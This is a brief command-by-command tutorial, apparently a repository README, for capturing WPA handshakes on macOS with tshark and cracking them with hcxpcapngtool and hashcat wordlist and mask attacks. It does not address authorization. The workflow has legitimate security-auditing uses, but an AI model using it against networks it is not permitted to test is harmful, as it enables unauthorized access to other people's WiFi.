**DISCLAIMER: This software/tutorial is for educational purposes only. It should not be used for illegal activity. The author is not responsible for its use. Don't be a dick.**

> No Chinese version tutorial provided

## Environment
MacBook Air M4\
macOS Sequoia 15.7

## Workflow
dumpcap/tshark(wireshark) -> tshark(wireshark) -> hcxpcapngtool -> Hashcat

## Step
### 1. brew install
```
brew install wireshark
brew install hcxtools
brew install hashcat
```

> If any errors occur in the following steps during use, include the complete path.

### 2. capture
> Before proceeding with the following steps, disconnect the WiFi connection first.

> The time required for capturing is uncertain, and the key is to capture the necessary data.

> The following paths can be customized.

```
sudo tshark -I -i en0 -w /var/tmp/cap.pcapng
# or
# sudo dumpcap -I -i en0 -w /var/tmp/cap.pcapng
```

### 3. check
```
sudo tshark -r /var/tmp/cap.pcapng -Y "eapol"
```

> If there are results, you can try the step 4.

### 4. extract
```
sudo hcxpcapngtool -o /var/tmp/all_handshakes.hc22000 /var/tmp/cap.pcapng
```

> If the handshake data is incomplete and no file will be generated, repeat the step 2.

### 5. crack
> Cracking does not guarantee success.

```
# If you have a password book.
sudo hashcat -m 22000 /var/tmp/all_handshakes.hc22000 ~/Downloads/password.txt

# According to the rules...
sudo hashcat -m 22000 /var/tmp/all_handshakes.hc22000 -a 3 '?d?d?d?d?d?d?d?d'

sudo hashcat -m 22000 /var/tmp/all_handshakes.hc22000 -a 3 '?l?l?l?d?d?d?d?d?d'

# ...
```
